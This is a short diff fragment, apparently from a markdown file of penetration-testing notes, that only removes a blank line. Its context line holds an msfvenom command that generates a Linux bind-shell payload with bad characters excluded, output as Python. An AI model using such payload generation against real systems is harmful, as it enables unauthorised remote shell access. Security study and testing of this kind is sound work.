@@ -209,7 +209,6 @@ msfvenom -p linux/x86/shell_bind_tcp -b '\x00\x09\x10\x13' LPORT=4450 -f python
 
 
 
-
 # Unclassified
 
 ### JS Prompt :
